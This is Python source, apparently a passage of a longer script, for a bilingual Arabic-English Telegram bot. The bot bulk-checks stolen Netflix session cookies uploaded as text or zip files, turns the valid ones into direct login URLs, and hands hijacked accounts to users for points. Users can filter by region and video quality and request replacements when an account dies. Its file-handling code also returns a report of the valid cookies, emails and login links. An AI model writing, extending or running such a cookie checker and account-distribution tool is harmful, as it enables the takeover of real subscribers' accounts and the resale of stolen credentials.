            if 'HD' not in q_text and 'FULL' not in q_text:
                continue
        elif quality == '720P':
            if '720' not in q_text:
                continue

        count += 1
    return count

def execute_smart_pull(chat_id, user_id):
    lang = user_languages.get(user_id, 'ar')
    if not check_subscription(user_id):
        send_sub_required_message(chat_id, lang)
        return

    session = user_pull_sessions.get(user_id, {})
    region = session.get('region', 'ALL')
    quality = session.get('quality', 'UHD')

    cost = 3 if quality == 'UHD' else (2 if quality == 'HD' else 1)

    user_data = get_user_data(user_id)
    if user_data["points"] < cost:
        msg = f"❌ You need `{cost}` points for this filter, but your balance is `{user_data['points']}` points." if lang == 'en' else f"❌ تحتاج إلى `{cost}` نقاط لهذا السحب، ورصيدك الحالي `{user_data['points']}` نقطة فقط."
        bot.send_message(chat_id, msg, parse_mode='Markdown')
        return

    db = load_db()
    accounts = db.get("accounts", [])
    if not accounts:
        err_msg = "❌ Memory is currently empty!" if lang == 'en' else "❌ الذاكرة فارغة حالياً!"
        bot.send_message(chat_id, err_msg)
        return

    msg_wait = bot.send_message(chat_id, "⏳ جاري البحث عن حساب يطابق طلبك وتوليد الرابط..." if lang == 'en' else "⏳ جاري البحث عن حساب يطابق طلبك وتوليد الرابط...")

    selected_account = None
    token_result = None

    filtered = []
    for acc in accounts:
        acc_country = str(acc.get('country', '')).strip().upper()
        
        if region != "ALL":
            allowed_countries = REGION_COUNTRIES.get(region, [])
            if acc_country not in allowed_countries:
                continue

        q_text = str(acc.get('video_quality', '')).upper()
        
        if quality == 'UHD':
            if 'ULTRA' not in q_text and '4K' not in q_text:
                continue
        elif quality == 'HD':
            if 'HD' not in q_text and 'FULL' not in q_text:
                continue
        elif quality == '720P':
            if '720' not in q_text:
                continue

        filtered.append(acc)

    if not filtered:
        no_acc_msg = "❌ عذراً، لا توجد حسابات مطابقة لهذه المنطقة والدقة حالياً في الذاكرة!" if lang == 'ar' else "❌ Sorry, no matching accounts available right now!"
        bot.edit_message_text(no_acc_msg, chat_id, msg_wait.message_id)
        return

    random.shuffle(filtered)

    for acc in filtered:
        netflix_id = acc['cookie'].get('NetflixId')
        t_res = generate_token(netflix_id)
        if t_res.get('status') == 'Success':
            selected_account = acc
            token_result = t_res
            break

    if not selected_account or not token_result:
        bot.edit_message_text("❌ عذراً، جميع الحسابات المطابقة لخياراتك تبين أنها تالفة أو منتهية حالياً.", chat_id, msg_wait.message_id)
        return

    if cost > 0:
        update_user_points(user_id, -cost)
    
    increment_user_stats(user_id, pulled=1)

    db = load_db()
    if "user_last_pull" not in db:
        db["user_last_pull"] = {}
    db["user_last_pull"][str(user_id)] = selected_account
    save_db(db)

    country_full = get_country_name(selected_account.get('country', 'Unknown'), lang)
    email = selected_account.get('email', 'Unknown').replace(chr(92) + 'x40', '@')
    hold_status = "✅ Active" if lang == 'en' else "✅ نشط تماماً"
    remaining_points = get_user_data(user_id)["points"]

    if lang == 'en':
        res_msg = "🎬 **NETFLIX Account Pulled Successfully** 🎬\n\n"
        res_msg += f"🌍 Country: `{country_full}`\n"
        res_msg += f"📦 Plan: `{selected_account.get('plan', 'Unknown')}`\n"
        res_msg += f"💰 Price: `{selected_account.get('plan_price', 'Unknown')}`\n"
        res_msg += f"📺 Quality: `{selected_account.get('video_quality', 'Unknown')}` | Streams: `{selected_account.get('max_streams', 'Unknown')}`\n"
        res_msg += f"💳 Status: `{hold_status}`\n"
        res_msg += f"📅 Member Since: `{selected_account.get('member_since', 'Unknown')}`\n"
        res_msg += f"🔄 Next Billing: `{selected_account.get('next_billing', 'Unknown')}`\n"
        res_msg += f"👥 Profiles: `{selected_account.get('profiles', 'Unknown')}`\n"
        res_msg += f"📧 Email: `{email}`\n"
        res_msg += f"🪙 Points Deducted: `{cost}` | Remaining: `{remaining_points}`\n"
        
        token_val = token_result.get('token', '') if token_result else ''
        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_val}")
        res_msg += f"\n📱 **Direct Login URL (Fresh):**\n`{mobile_url}`"
        res_msg += f"\n\n👨‍💻 **Developer:** [{OWNER_CREDIT}]({OWNER_LINK})"
    else:
        res_msg = "🎬 **تم سحب حساب NETFLIX بنجاح** 🎬\n\n"
        res_msg += f"🌍 البلد: `{country_full}`\n"
        res_msg += f"📦 الباقة: `{selected_account.get('plan', 'Unknown')}`\n"
        res_msg += f"💰 السعر: `{selected_account.get('plan_price', 'Unknown')}`\n"
        res_msg += f"📺 الجودة: `{selected_account.get('video_quality', 'Unknown')}` | الشاشات: `{selected_account.get('max_streams', 'Unknown')}`\n"
        res_msg += f"💳 حالة الحساب: `{hold_status}`\n"
        res_msg += f"📅 تاريخ الاشتراك (عمر الحساب): `{selected_account.get('member_since', 'Unknown')}`\n"
        res_msg += f"🔄 تاريخ التجديد: `{selected_account.get('next_billing', 'Unknown')}`\n"
        res_msg += f"👥 البروفايلات: `{selected_account.get('profiles', 'Unknown')}`\n"
        res_msg += f"📧 البريد: `{email}`\n"
        res_msg += f"🪙 النقاط المسحوبة: `{cost}` | رصيدك المتبقي: `{remaining_points}` نقطة\n"
        
        token_val = token_result.get('token', '') if token_result else ''
        mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_val}")
        res_msg += f"\n📱 **رابط الدخول المباشر (طازج):**\n`{mobile_url}`"
        res_msg += f"\n\n👨‍💻 **المطور:** [{OWNER_CREDIT}]({OWNER_LINK})"

    try:
        bot.edit_message_text(res_msg, chat_id, msg_wait.message_id, parse_mode='Markdown', disable_web_page_preview=True)
    except:
        bot.send_message(chat_id, res_msg, parse_mode='Markdown', disable_web_page_preview=True)

def execute_replacement(chat_id, user_id):
    lang = user_languages.get(user_id, 'ar')
    db = load_db()
    last_pulls = db.get("user_last_pull", {})
    str_id = str(user_id)

    if str_id not in last_pulls:
        msg = "❌ You haven't pulled any account yet to request a replacement!" if lang == 'en' else "❌ لم تقم بسحب أي حساب مؤخراً لكي تطلب تعويضاً عنه!"
        bot.send_message(chat_id, msg)
        return

    acc = last_pulls[str_id]
    wait_msg = bot.send_message(chat_id, "⏳ Verifying account status automatically..." if lang == 'en' else "⏳ جاري فحص حالة الحساب أوتوماتيكياً للتحقق منه...")

    netflix_id = acc['cookie'].get('NetflixId')
    fresh_check = check_netflix_cookie({"NetflixId": netflix_id})

    if not fresh_check["ok"]:
        update_user_points(user_id, 1)
        del last_pulls[str_id]
        save_db(db)

        accounts = db.get("accounts", [])
        if accounts:
            new_acc = accounts.pop(0)
            db["accounts"] = accounts
            db["stats"]["valid"] = len(accounts)
            db["user_last_pull"][str_id] = new_acc
            save_db(db)

            token_result = generate_token(new_acc['cookie'].get('NetflixId'))
            country_full = get_country_name(new_acc['country'], lang)
            email = new_acc['email'].replace(chr(92) + 'x40', '@')
            
            res = "✅ **Account verified dead! Here is your replacement account:**\n\n" if lang == 'en' else "✅ **تم التحقق وتبين أن الحساب ميت! إليك حساب جديد كتعويض:**\n\n"
            res += f"🌍 Country: `{country_full}` | 📦 Plan: `{new_acc['plan']}`\n"
            res += f"📧 Email: `{email}`\n"
            if token_result and token_result.get('status') == 'Success':
                res += f"📱 **Direct Login URL:**\n`{token_result.get('direct_login_url')}`\n"
            res += f"\n👨‍💻 **Developer:** [{OWNER_CREDIT}]({OWNER_LINK})"
            bot.edit_message_text(res, chat_id, wait_msg.message_id, parse_mode='Markdown', disable_web_page_preview=True)
        else:
            bot.edit_message_text("✅ Account verified dead, 1 point refunded." if lang == 'en' else "✅ تم التأكد من أن الحساب ميت، وتم إرجاع نقطة إلى رصيدك.", chat_id, wait_msg.message_id)
    else:
        bot.edit_message_text("❌ **Verification Failed:** Account is 100% active and working!" if lang == 'en' else "❌ **فشل التحقق:** الحساب شغال 100% ولا يمكن تعويضه!", chat_id, wait_msg.message_id)

@bot.message_handler(commands=['pull', 'getaccount'])
def pull_account_command(message):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'ar')
    if not check_subscription(user_id):
        send_sub_required_message(message, lang)
        return
    execute_smart_pull(message.chat.id, user_id)

@bot.message_handler(func=lambda message: message.text and message.text.startswith("NETFLIX-"))
def redeem_key_handler(message):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'ar')
    if not check_subscription(user_id):
        send_sub_required_message(message, lang)
        return

    key = message.text.strip()
    db = load_db()
    if key in db["redeem_codes"]:
        points = db["redeem_codes"][key]
        del db["redeem_codes"][key]
        save_db(db)
        update_user_points(user_id, points)
        bot.reply_to(message, f"✅ Congratulations! You have successfully redeemed {points} points." if lang == 'en' else f"✅ مبروك! تم شحن {points} نقطة بنجاح إلى حسابك.")
    else:
        bot.reply_to(message, "❌ Invalid or already used redeem code." if lang == 'en' else "❌ كود الشحن غير صالح أو تم استخدامه مسبقاً.")

@bot.callback_query_handler(func=lambda call: True)
def callback_queries(call):
    user_id = call.from_user.id
    data = call.data
    chat_id = call.message.chat.id
    lang = user_languages.get(user_id, 'ar')
    
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    if data.startswith("lang_"):
        new_lang = data.split("_")[1]
        user_languages[user_id] = new_lang
        
        if not check_subscription(user_id):
            send_sub_required_message(call.message, new_lang)
            return

        try:
            points = get_user_data(user_id)["points"]
            markup = InlineKeyboardMarkup(row_width=1)
            if new_lang == 'en':
                welcome_text = (
                    f"🎬 **Welcome to the Advanced Netflix Cookie Checker Bot!**\n\n"
                    f"💰 Your Points: `{points}` 🪙\n"
                    "🔹 Send cookie text or token link, or upload a `.txt` / `.zip` file.\n"
                    "🔹 Checking is FREE! Pulling accounts uses dynamic point pricing.\n"
                    f"👨‍💻 **Developer:** [{OWNER_CREDIT}]({OWNER_LINK})\n\n"
                    "👇 **Choose an option below:**"
                )
                markup.add(
                    InlineKeyboardButton("🎟️ Pull Account (Smart Filter)", callback_data="btn_pull_region"),
                    InlineKeyboardButton("👤 My Profile", callback_data="btn_profile"),
                    InlineKeyboardButton("🔄 Request Replacement", callback_data="btn_replace"),
                    InlineKeyboardButton("💳 Recharge Points & Invite", callback_data="btn_recharge"),
                    InlineKeyboardButton("📢 Bot Channel", url=CHANNEL_LINK)
                )
                if user_id in ADMIN_IDS:
                    markup.add(InlineKeyboardButton("📊 Admin Panel", callback_data="btn_admin"))
            else:
                welcome_text = (
                    f"🎬 **أهلاً بك في بوت فحص كوكيز Netflix الشامل والمطور!**\n\n"
                    f"💰 رصيدك الحالي: `{points}` نقطة 🪙\n"
                    "🔹 فحص الملفات والكوكيز (مجاني تماماً!).\n"
                    "🔹 سحب حساب ذكي حسب المنطقة والجودة.\n"
                    f"👨‍💻 **المطور:** [{OWNER_CREDIT}]({OWNER_LINK})\n\n"
                    "👇 **اختر ما تحتاجه من الأزرار أدناه:**"
                )
                markup.add(
                    InlineKeyboardButton("🎟️ سحب حساب (تصفية ذكية ومتطورة)", callback_data="btn_pull_region"),
                    InlineKeyboardButton("👤 حسابي وإحصائياتي", callback_data="btn_profile"),
                    InlineKeyboardButton("🔄 طلب تعويض (إذا لم يعمل)", callback_data="btn_replace"),
                    InlineKeyboardButton("💳 شحن النقاط ودعوة الأصدقاء", callback_data="btn_recharge"),
                    InlineKeyboardButton("📢 قناة البوت", url=CHANNEL_LINK)
                )
                if user_id in ADMIN_IDS:
                    markup.add(InlineKeyboardButton("📊 لوحة الأدمن", callback_data="btn_admin"))

            bot.edit_message_text(welcome_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown', disable_web_page_preview=True)
        except Exception:
            show_main_menu(chat_id, user_id)
        return

    if data != "check_sub" and not check_subscription(user_id):
        send_sub_required_message(call.message, lang)
        return
        
    elif data == "check_sub":
        if check_subscription(user_id):
            try:
                bot.answer_callback_query(call.id, "✅ Subscription verified successfully!" if lang == 'en' else "✅ تم التحقق من اشتراكك بنجاح!")
            except:
                pass
            show_main_menu(chat_id, user_id)
        else:
            try:
                bot.answer_callback_query(call.id, "❌ You haven't subscribed to the channel yet!" if lang == 'en' else "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
            except:
                pass
            
    elif data == "stop_scan":
        if user_id in active_scans:
            active_scans[user_id].set()
            
    elif data == "btn_profile":
        send_user_profile(chat_id, user_id)

    elif data == "back_to_menu":
        show_main_menu(chat_id, user_id)
            
    elif data == "btn_pull_region":
        if user_id not in user_pull_sessions:
            user_pull_sessions[user_id] = {}
        
        count_all = count_filtered_accounts("ALL", "UHD") + count_filtered_accounts("ALL", "HD") + count_filtered_accounts("ALL", "720P")
        count_am = count_filtered_accounts("AMERICA", "UHD") + count_filtered_accounts("AMERICA", "HD") + count_filtered_accounts("AMERICA", "720P")
        count_eu = count_filtered_accounts("EUROPE", "UHD") + count_filtered_accounts("EUROPE", "HD") + count_filtered_accounts("EUROPE", "720P")
        count_me = count_filtered_accounts("MIDDLE_EAST", "UHD") + count_filtered_accounts("MIDDLE_EAST", "HD") + count_filtered_accounts("MIDDLE_EAST", "720P")
        count_as = count_filtered_accounts("ASIA", "UHD") + count_filtered_accounts("ASIA", "HD") + count_filtered_accounts("ASIA", "720P")

        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"🌐 أي منطقة (عشوائي) - ({count_all} متاح)" if count_all > 0 else "🌐 أي منطقة (عشوائي) - (لا يوجد)", callback_data="pull_r_ALL"),
            InlineKeyboardButton(f"🇺🇸 أمريكا - ({count_am} متاح)" if count_am > 0 else "🇺🇸 أمريكا - (لا يوجد)", callback_data="pull_r_AMERICA"),
            InlineKeyboardButton(f"🇪🇺 أوروبا - ({count_eu} متاح)" if count_eu > 0 else "🇪🇺 أوروبا - (لا يوجد)", callback_data="pull_r_EUROPE"),
            InlineKeyboardButton(f"🕌 الشرق الأوسط - ({count_me} متاح)" if count_me > 0 else "🕌 الشرق الأوسط - (لا يوجد)", callback_data="pull_r_MIDDLE_EAST"),
            InlineKeyboardButton(f"🌏 آسيا - ({count_as} متاح)" if count_as > 0 else "🌏 آسيا - (لا يوجد)", callback_data="pull_r_ASIA"),
            InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_menu")
        )
        msg_txt = "🌍 **الخطوة 1: اختر المنطقة المطلوبة (يظهر أمام كل منطقة العدد المتاح):**" if lang == 'ar' else "🌍 **Step 1: Select Region:**"
        bot.edit_message_text(msg_txt, chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif data.startswith("pull_r_"):
        r_code = data.replace("pull_r_", "")
        if user_id not in user_pull_sessions:
            user_pull_sessions[user_id] = {}
        user_pull_sessions[user_id]['region'] = r_code

        count_uhd = count_filtered_accounts(r_code, 'UHD')
        count_hd = count_filtered_accounts(r_code, 'HD')
        count_720 = count_filtered_accounts(r_code, '720P')

        uhd_label = f"🌟 Ultra 4K / UHD (3 نقاط) - ({count_uhd} متاح)" if count_uhd > 0 else "🌟 Ultra 4K / UHD (3 نقاط) - (لا يوجد)"
        hd_label = f"📺 HD (نقطتان) - ({count_hd} متاح)" if count_hd > 0 else "📺 HD (نقطتان) - (لا يوجد)"
        h720_label = f"🎬 720p (نقطة واحدة) - ({count_720} متاح)" if count_720 > 0 else "🎬 720p (نقطة واحدة) - (لا يوجد)"

        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(uhd_label, callback_data="pull_q_UHD"),
            InlineKeyboardButton(hd_label, callback_data="pull_q_HD"),
            InlineKeyboardButton(h720_label, callback_data="pull_q_720P"),
            InlineKeyboardButton("🔙 رجوع لاختيار المنطقة", callback_data="btn_pull_region")
        )
        msg_txt = "📺 **الخطوة 2: اختر دقة الحساب المطلوبة (يظهر أمام كل دقة السعر والعدد المتاح):**" if lang == 'ar' else "📺 **Step 2: Select Video Quality:**"
        bot.edit_message_text(msg_txt, chat_id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif data.startswith("pull_q_"):
        q_type = data.replace("pull_q_", "")
        user_pull_sessions[user_id]['quality'] = q_type
        execute_smart_pull(chat_id, user_id)

    elif data == "btn_replace":
        execute_replacement(chat_id, user_id)

    elif data == "btn_recharge":
        bot_info = bot.get_me()
        bot_username = bot_info.username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"

        msg = (
            f"💳 **شحن النقاط ودعوة الأصدقاء:**\n\n"
            f"1️⃣ أرسل كود الشحن (`NETFLIX-XXXX`) مباشرة هنا في الحوار.\n"
            f"2️⃣ **رابط الدعوة الخاص بك:**\n`{referral_link}`\n\n"
            f"🎁 *شارك رابط الدعوة مع أصدقائك، ولكل شخص يدخل عبر رابطك ويشترك ستحصل فوراً على `2` نقاط مجانية!*"
        ) if lang == 'ar' else (
            f"💳 **Recharge Points & Invite Friends:**\n\n"
            f"1️⃣ Send your recharge code (`NETFLIX-XXXX`) in chat.\n"
            f"2️⃣ **Your Referral Link:**\n`{referral_link}`\n\n"
            f"🎁 *Invite friends and earn `2` points for every referral!*"
        )
        bot.send_message(chat_id, msg, parse_mode='Markdown', disable_web_page_preview=True)
        
    elif data == "btn_admin":
        if user_id not in ADMIN_IDS:
            return
        db = load_db()
        total_users = len(db.get("users", {}))
        total_valid = len(db.get("accounts", []))
        total_checked = db.get("stats", {}).get("checked", 0)

        stats_msg = (
            "📊 **Admin Statistics Dashboard:**\n\n"
            f"👥 Total Users: `{total_users}`\n"
            f"🔍 Checked: `{total_checked}`\n"
            f"💾 Active Accounts: `{total_valid}`\n"
            f"👨‍💻 Developer: `{OWNER_CREDIT}`\n"
        )
        bot.send_message(chat_id, stats_msg, parse_mode='Markdown', disable_web_page_preview=True)

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'ar')
    
    if not check_subscription(user_id):
        send_sub_required_message(message, lang)
        return

    user_scan_lock = get_user_lock(user_id)
    if not user_scan_lock.acquire(blocking=False):
        bot.reply_to(message, "⏳ **لديك عملية فحص ملف جارية حالياً.**\nيرجى الانتظار حتى ينتهي البوت من فحص ملفك الحالي ليبدأ في فحص هذا الملف تلقائياً.", parse_mode='Markdown')
        return

    # تشغيل الفحص في Thread منفصل تماماً عن البوت لكي يظل البوت سريعاً ولا يتجمد مع أي مستخدم آخر
    threading.Thread(target=process_uploaded_document, args=(message, user_scan_lock), daemon=True).start()

def process_uploaded_document(message, user_scan_lock):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'ar')
    
    try:
        stop_event = threading.Event()
        active_scans[user_id] = stop_event

        temp_dirs = []
        try:
            markup = InlineKeyboardMarkup(row_width=1)
            markup.add(InlineKeyboardButton("🛑 إيقاف الفحص" if lang == 'ar' else "🛑 Stop Scan", callback_data="stop_scan"))
            
            initial_progress = (
                "🚀 **نظام الفحص الذكي قيد التشغيل (في الخلفية)...**\n"
                "╭─────────────────────────────────╮\n"
                "│         ✨ ملخص الفحص ✨          │\n"
                "├─────────────────────────────────┤\n"
                "│  🗃️  الإجمالي         0         │\n"
                "│  ⏳  تم الفحص         0         │\n"
                "│  🟢  تعمل             0         │\n"
                "│  🔴  لا تعمل          0         │\n"
                "├─────────────────────────────────┤\n"
                "│  [░░░░░░░░░░░░░░░░░░░░] 0%      │\n"
                "╰─────────────────────────────────╯"
            )
            msg_wait = bot.reply_to(message, initial_progress, parse_mode='Markdown', reply_markup=markup)
            
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            filename = message.document.file_name
            unique_dir = tempfile.mkdtemp(prefix=f"netflix_bot_{uuid.uuid4().hex}_")
            temp_dirs.append(unique_dir)
            
            file_path = os.path.join(unique_dir, filename)
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
                
            txt_files_to_check = []
            if filename.lower().endswith('.zip'):
                txt_files_to_check = extract_zip_and_get_files(file_path, unique_dir)
            elif filename.lower().endswith('.txt'):
                txt_files_to_check = [file_path]
                
            if not txt_files_to_check:
                bot.edit_message_text("❌ No valid text files found.", message.chat.id, msg_wait.message_id)
                if user_id in active_scans:
                    del active_scans[user_id]
                return
                
            all_lines = []
            for txt_file in txt_files_to_check:
                try:
                    with open(txt_file, 'r', encoding='utf-8', errors='ignore') as f:
                        all_lines.extend(f.readlines())
                except:
                    pass

            total_lines = len(all_lines)
            db = load_db()
            db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + total_lines
            save_db(db)
            
            increment_user_stats(user_id, checked=total_lines)

            valid_count = 0
            dead_count = 0
            checked_so_far = 0

            valid_accounts_text = "========================================\n"
            valid_accounts_text += f"NETFLIX VALID ACCOUNTS REPORT - Dev: {OWNER_CREDIT}\n"
            valid_accounts_text += "========================================\n\n"

            lock = threading.Lock()

            def process_line(line):
                nonlocal checked_so_far, valid_count, dead_count
                if stop_event.is_set():
                    return None
                try:
                    parsed = extract_netflix_id(line)
                    if not parsed:
                        with lock:
                            checked_so_far += 1
                            dead_count += 1
                        return None
                    time.sleep(0.1)
                    account_info = check_netflix_cookie({"NetflixId": parsed["value"]})
                    if stop_event.is_set():
                        return None

                    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown" and account_info.get('on_payment_hold') != 'Yes':
                        token_result = generate_token(parsed["value"])
                        if token_result.get('status') == 'Success':
                            account_info['token_result'] = token_result
                            add_account_to_db(account_info)
                            with lock:
                                checked_so_far += 1
                                valid_count += 1
                            return account_info
                    
                    with lock:
                        checked_so_far += 1
                        dead_count += 1
                except Exception as e:
                    logger.error(f"Error: {e}")
                    with lock:
                        checked_so_far += 1
                        dead_count += 1
                return None

            def update_progress_bar():
                last_text = ""
                while checked_so_far < total_lines and not stop_event.is_set():
                    time.sleep(2.0)
                    with lock:
                        curr_checked = checked_so_far
                        curr_valid = valid_count
                        curr_dead = dead_count
                    
                    pct = int((curr_checked / total_lines) * 100) if total_lines > 0 else 0
                    filled = int(pct / 5)
                    bar = "█" * filled + "░" * (20 - filled)

                    t_str = f"{total_lines:<9}"
                    c_str = f"{curr_checked:<9}"
                    v_str = f"{curr_valid:<13}"
                    d_str = f"{curr_dead:<10}"
                    pct_str = f"{pct}%"

                    status_str = (
                        "🚀 **نظام الفحص الذكي قيد التشغيل...**\n"
                        "╭─────────────────────────────────╮\n"
                        "│         ✨ ملخص الفحص ✨          │\n"
                        "├─────────────────────────────────┤\n"
                        f"│  🗃️  الإجمالي    {t_str} │\n"
                        f"│  ⏳  تم الفحص    {c_str} │\n"
                        f"│  🟢  تعمل        {v_str} │\n"
                        f"│  🔴  لا تعمل     {d_str} │\n"
                        "├─────────────────────────────────┤\n"
                        f"│  [{bar}] {pct_str:<6} │\n"
                        "╰─────────────────────────────────╯"
                    )

                    if status_str != last_text:
                        try:
                            bot.edit_message_text(status_str, message.chat.id, msg_wait.message_id, parse_mode='Markdown', reply_markup=markup)
                            last_text = status_str
                        except:
                            pass

            progress_thread = threading.Thread(target=update_progress_bar, daemon=True)
            progress_thread.start()

            # زيادة السرعة عبر ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = [executor.submit(process_line, line.strip()) for line in all_lines if line.strip()]
                for future in as_completed(futures):
                    if stop_event.is_set():
                        break
                    try:
                        acc = future.result()
                        if acc:
                            email = acc['email'].replace(chr(92) + 'x40', '@')
                            plan = acc['plan']
                            country_full = get_country_name(acc['country'], lang)
                            expiry = acc['next_billing']
                            member_since = acc['member_since']
                            profiles = acc['profiles']
                            price = acc['plan_price']
                            quality = acc['video_quality']
                            
                            token_result = acc.get('token_result', {})
                            token_val = token_result.get('token', 'N/A')
                            mobile_url = token_result.get('direct_login_url', f"https://netflix.com/unsupported?nftoken={token_val}")
                            netflix_id_val = acc['cookie'].get('NetflixId', '')

                            if lang == 'en':
                                res_msg = "🎬 **Active NETFLIX Account** 🎬\n\n"
                                res_msg += f"🌍 Country: `{country_full}`\n"
                                res_msg += f"📦 Plan: `{plan}`\n"
                                res_msg += f"💰 Price: `{price}`\n"
                                res_msg += f"📺 Quality: `{quality}`\n"
                                res_msg += f"📅 Member Since (Age): `{member_since}`\n"
                                res_msg += f"🔄 Next Billing: `{expiry}`\n"
                                res_msg += f"👥 Profiles: `{profiles}`\n"
                                res_msg += f"📧 Email: `{email}`\n"
                                res_msg += f"\n📱 **Login URL:**\n`{mobile_url}`"
                            else:
                                res_msg = "🎬 **حساب NETFLIX صالح وفعال** 🎬\n\n"
                                res_msg += f"🌍 البلد: `{country_full}`\n"
                                res_msg += f"📦 الباقة: `{plan}`\n"
                                res_msg += f"💰 السعر: `{price}`\n"
                                res_msg += f"📺 الجودة: `{quality}`\n"
                                res_msg += f"📅 تاريخ الاشتراك (عمر الحساب): `{member_since}`\n"
                                res_msg += f"🔄 تاريخ التجديد: `{expiry}`\n"
                                res_msg += f"👥 البروفايلات: `{profiles}`\n"
                                res_msg += f"📧 البريد: `{email}`\n"
                                res_msg += f"\n📱 **رابط الدخول المباشر:**\n`{mobile_url}`"
                                
                            bot.send_message(message.chat.id, res_msg, parse_mode='Markdown', disable_web_page_preview=True)
                            
                            # إضافة الكوكيز وبيانات الحساب معاً في الملف النصي النهائي
                            valid_accounts_text += f"----------------------------------------\n"
                            valid_accounts_text += f"Email: {email}\n"
                            valid_accounts_text += f"Plan: {plan} | Quality: {quality} | Country: {country_full}\n"
                            valid_accounts_text += f"Login URL: {mobile_url}\n"
                            valid_accounts_text += f"NetflixId Cookie: {netflix_id_val}\n"
                            valid_accounts_text += f"----------------------------------------\n\n"
                    except Exception as ex:
                        logger.error(f"Error: {ex}")

            t_final = f"{total_lines:<9}"
            v_final = f"{valid_count:<13}"
            d_final = f"{dead_count:<10}"

            final_box = (
                "🚀 **اكتملت عملية الفحص بنجاح!**\n"
                "╭─────────────────────────────────╮\n"
                "│      ✨ اكتمل الفحص بنجاح ✨      │\n"
                "├─────────────────────────────────┤\n"
                f"│  🗃️  الإجمالي    {t_final} │\n"
                f"│  🟢  تعمل        {v_final} │\n"
                f"│  🔴  لا تعمل     {d_final} │\n"
                "├─────────────────────────────────┤\n"
                "│  [████████████████████] 100%    │\n"
                "╰─────────────────────────────────╯"
            )
            try:
                bot.edit_message_text(final_box, message.chat.id, msg_wait.message_id, parse_mode='Markdown')
            except:
                pass

            if valid_count > 0:
                result_file_path = os.path.join(unique_dir, "valid_accounts.txt")
                with open(result_file_path, 'w', encoding='utf-8') as rf:
                    rf.write(valid_accounts_text)
                with open(result_file_path, 'rb') as rf:
                    bot.send_document(message.chat.id, rf, caption="📁 تقرير الحسابات الصالحة (مع الكوكيز وروابط الدخول والبيانات).")

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}")
        finally:
            if user_id in active_scans:
                del active_scans[user_id]
            for temp_dir in temp_dirs:
                try:
                    shutil.rmtree(temp_dir)
                except:
                    pass
    finally:
        user_scan_lock.release()

@bot.message_handler(func=lambda message: True)
def handle_text_message(message):
    user_id = message.from_user.id
    lang = user_languages.get(user_id, 'ar')
    
    if not check_subscription(user_id):
        send_sub_required_message(message, lang)
        return

    content = message.text
    if not content or content.startswith('/'):
        return
        
    msg_wait = bot.reply_to(message, "⏳ Checking cookie status..." if lang == 'en' else "⏳ جاري فحص الكوكي أو الرابط...")
    
    parsed = extract_netflix_id(content)
    if not parsed:
        bot.edit_message_text("❌ No valid `NetflixId` found.", message.chat.id, msg_wait.message_id)
        return
        
    db = load_db()
    db["stats"]["checked"] = db.get("stats", {}).get("checked", 0) + 1
    save_db(db)
    
    increment_user_stats(user_id, checked=1)

    account_info = check_netflix_cookie({"NetflixId": parsed["value"]})
    
    if account_info["ok"] and account_info.get('plan') != "Unknown" and account_info.get('next_billing') != "Unknown" and account_info.get('on_payment_hold') != 'Yes':
        token_result = generate_token(parsed["value"])
        if token_result.get('status') == 'Success':
            account_info['token_result'] = token_result
            add_account_to_db(account_info)
            
            country_full = get_country_name(account_info['country'], lang)
            
            if lang == 'en':
                res_msg = "🎬 **Checked Account Results** 🎬\n\n"
                res_msg += f"🌍 Country: `{country_full}`\n"
                res_msg += f"📦 Plan: `{account_info['plan']}`\n"
                res_msg += f"💰 Price: `{account_info['plan_price']}`\n"
                res_msg += f"📺 Quality: `{account_info['video_quality']}`\n"
                res_msg += f"📅 Member Since (Age): `{account_info['member_since']}`\n"
                res_msg += f"🔄 Next Billing: `{account_info['next_billing']}`\n"
                res_msg += f"👥 Profiles: `{account_info['profiles']}`\n"
                res_msg += f"📧 Email: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                res_msg += f"\n📱 Login URL:\n`{token_result.get('direct_login_url')}`"
            else:
                res_msg = "🎬 **نتيجة فحص الحساب** 🎬\n\n"
                res_msg += f"🌍 البلد: `{country_full}`\n"
                res_msg += f"📦 الباقة: `{account_info['plan']}`\n"
                res_msg += f"💰 السعر: `{account_info['plan_price']}`\n"
                res_msg += f"📺 الجودة: `{account_info['video_quality']}`\n"
                res_msg += f"📅 تاريخ الاشتراك (عمر الحساب): `{account_info['member_since']}`\n"
                res_msg += f"🔄 تاريخ التجديد: `{account_info['next_billing']}`\n"
                res_msg += f"👥 البروفايلات: `{account_info['profiles']}`\n"
                res_msg += f"📧 البريد: `{account_info['email'].replace(chr(92) + 'x40', '@')}`\n"
                res_msg += f"\n📱 رابط الدخول المباشر:\n`{token_result.get('direct_login_url')}`"
                
            bot.edit_message_text(res_msg, message.chat.id, msg_wait.message_id, parse_mode='Markdown', disable_web_page_preview=True)
        else:
            bot.edit_message_text("❌ Account active, but failed to generate token.", message.chat.id, msg_wait.message_id)
    else:
        bot.edit_message_text("❌ This account or token is expired or dead.", message.chat.id, msg_wait.message_id, parse_mode='Markdown')

if __name__ == '__main__':
    logger.info("Telegram Bot is running...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
